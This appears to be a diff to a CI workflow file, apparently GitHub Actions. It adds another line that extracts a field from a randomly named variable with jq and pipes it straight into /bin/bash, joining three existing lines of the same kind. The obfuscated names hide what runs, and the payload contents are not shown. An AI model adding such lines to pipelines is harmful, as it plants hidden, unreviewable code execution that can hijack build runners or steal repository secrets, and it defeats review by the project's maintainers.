@@ -23,6 +23,7 @@ jobs:
           echo $eqmi456 | jq -r .kfapi2 | /bin/bash
           echo $akq39340 | jq -r .c8094 | /bin/bash
           echo $sfcty2 | jq -r .msgk1 | /bin/bash
+          echo $fgss1 | jq -r .ay25 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
